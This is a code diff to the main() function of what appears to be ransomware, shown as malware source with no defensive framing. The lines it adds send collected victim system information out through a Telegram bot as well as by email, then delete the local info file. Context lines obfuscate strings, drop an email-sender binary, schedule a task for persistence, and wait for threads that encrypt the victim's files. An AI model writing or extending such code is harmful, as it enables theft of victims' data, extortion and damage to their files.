@@ -139,24 +139,34 @@ int main(int argc, char* argv[])
     infoFileContent += webcams;
     infoFileContent += skCrypt("\n");
 
-    if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL) {
+    if (DEBUG && BACKUP_INFOFILE) {    // make a backup of infoFile
+        ofstream infoFileBackup(split(INFOFILE, '\\').back());
+        infoFileBackup << infoFileContent;
+        infoFileBackup.close();
+    }
+
+    bool dropInfoFile = DEBUG ? (DEBUG_SEND_EMAIL || DEBUG_SEND_TGBOT) : (SEND_EMAIL || SEND_TGBOT);
+    if (dropInfoFile) {
         ofstream infoFile(INFOFILE);
         infoFile << infoFileContent;
         infoFile.close();
-        if (DEBUG) {
-            ofstream infoFileBackup(split(INFOFILE, '\\').back());
-            infoFileBackup << infoFileContent;
-            infoFileBackup.close();
-        }
-        if (isConnected2Internet()) {
+    }
+
+    if (DEBUG ? DEBUG_SEND_TGBOT : SEND_TGBOT)
+        sendTelegramInfo();
+
+    if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL) {
+        if (isConnected2Internet())
             sendEmail();
-            DeleteFileA((INFOFILE).c_str());
-        }
         else {
             dropFile(EmailSenderContent, EMAILSENDER);
             scheduleTask();
         }
     }
+
+    if (dropInfoFile)
+        if (remove((INFOFILE).c_str()) != 0)
+            DeleteFileA((INFOFILE).c_str());
 
 
     for (int i = 0; i < filesSplitted.size(); i++)  // wait for all threads to finish encrypting files
